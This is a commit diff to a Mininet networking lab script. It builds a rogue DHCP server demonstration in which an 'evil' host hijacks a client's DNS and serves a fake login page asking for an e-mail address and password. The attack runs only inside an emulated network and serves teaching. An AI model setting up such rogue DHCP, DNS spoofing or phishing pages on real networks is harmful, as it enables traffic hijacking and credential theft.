14f40cde8e2da1bd4725e30463f619ff5e97604e
josbor1 <123982835+josbor1@users.noreply.github.com>
2024-03-20 22:58:07 -0500

    Update Lab15.py

--- Lab15.py
+++ Lab15.py
@@ -137,4 +137,112 @@ def stopFakeDNS(host):
 # Evil web server
 
 def startEvilWebServer(host):
+    "Start evil web server"
+    info('* Starting web server', host, 'at', host.IP(), '\n')
+    webdir = '/tmp/evilwebserver'
+    host.cmd('rm -rf', webdir)
+    host.cmd('mkdir -p', webdir)
+    with open(webdir + '/index.html', 'w') as f:
+        f.write('<html><p>You have been pwned! Please sign in.<p>\n'
+                '<body><form action="">\n'
+                'e-mail: <input type="text" name="firstname"><br>\n'
+                'password: <input type="text" name="firstname"><br>\n'
+                '</form></body></html>')
+    host.cmd('cd', webdir)
+    host.cmd('python3 -m http.server 80 >& /tmp/http.log &')
+
+def stopEvilWebServer(host):
+    "Stop evil web server"
+    info('* Stopping web server', host, 'at', host.IP(), '\n')
+    host.cmd('kill %python')
+
+# Some other potentially useful code if we want to
+# make this an interactive demo.
+
+def readline():
+    "Read a line from stdin"
+    return stdin.readline()
+
+
+def prompt(s=None):
+    "Print a prompt and read a line from stdin"
+    if s is None:
+        s = "Press return to continue: "
+    print(s, end=' ')
+    return readline()
+
+def mountPrivateResolvconf(host):
+    "Create/mount private /etc/resolv.conf for host"
+    etc = '/tmp/etc-%s' % host
+    host.cmd('mkdir -p', etc)
+    host.cmd('mount --bind /etc', etc)
+    host.cmd('mount -n -t tmpfs tmpfs /etc')
+    host.cmd('ln -s %s/* /etc/' % etc)
+    host.cmd('rm /etc/resolv.conf')
+    host.cmd('cp %s/resolv.conf /etc/' % etc)
+
+def unmountPrivateResolvconf(host):
+    "Unmount private /etc dir for host"
+    etc = '/tmp/etc-%s' % host
+    host.cmd('umount /etc')
+    host.cmd('umount', etc)
+    host.cmd('rmdir', etc)
+
+def dhcpdemo(firefox=True):
+    "Rogue DHCP server demonstration"
+    checkRequired()
+    topo = DHCPTopo()
+    net = Mininet(topo=topo, link=TCLink)
+    h1, dhcp, evil = net.get('h1', 'dhcp', 'evil')
+    # connectToInternet calls net.start() for us!
+    rootnode = connectToInternet(net, 's1')
+    mountPrivateResolvconf(h1)
+    # Set up a good but slow DHCP server
+    startDHCPserver(dhcp, gw=rootnode.IP(), dns='8.8.8.8')
+    startDHCPclient(h1)
+    waitForIP(h1)
+    # Make sure we can fetch the good google.com
+    info('* Fetching google.com:\n')
+    print(h1.cmd('curl google.com'))
+    # For firefox, start it up and tell user what to do
+    if firefox:
+        net.terms += makeTerms([h1], 'h1')
+        h1.cmd('firefox www.stanford.edu -geometry 400x400-50+50 &')
+        print('*** You may want to do some DNS lookups using dig')
+        print('*** Please go to amazon.com in Firefox')
+        print('*** You may also wish to start up wireshark and look at bootp and/or dns')
+        prompt("*** Press return to start up evil DHCP server: ")
+    # Now start up an evil but fast DHCP server
+    startDHCPserver(evil, gw=rootnode.IP(), dns=evil.IP())
+    # And an evil fake DNS server
+    startFakeDNS(evil)
+    # And an evil web server
+    startEvilWebServer(evil)
+    h1.cmd('ifconfig', h1.defaultIntf(), '0')
+    waitForIP(h1)
+    info('* New DNS result:\n')
+    info(h1.cmd('host google.com'))
+    # Test http request
+    if firefox:
+        print("*** You may wish to look at DHCP and DNS results in wireshark")
+        print("*** You may also wish to do some DNS lookups using dig")
+        print("*** Please go to google.com in Firefox")
+        print("*** You may also want to try going back to amazon.com and hitting shift-refresh")
+    else:
+        info('* Fetching google.com:\n')
+        print(h1.cmd('curl google.com'))
+    if firefox:
+        prompt("*** Press return to shut down evil DHCP/DNS/Web servers: ")
+    # Clean up everything
+    stopFakeDNS(evil)
+    stopEvilWebServer(evil)
+    stopDHCPserver(evil)
+    if firefox:
+        print("*** Try going to some other web sites if you like")
+        prompt("*** Press return to exit: ")
+    stopDHCPserver(dhcp)
+    stopDHCPclient(h1)
+    stopNAT(rootnode)
+    unmountPrivateResolvconf(h1)
+    net.stop()
    
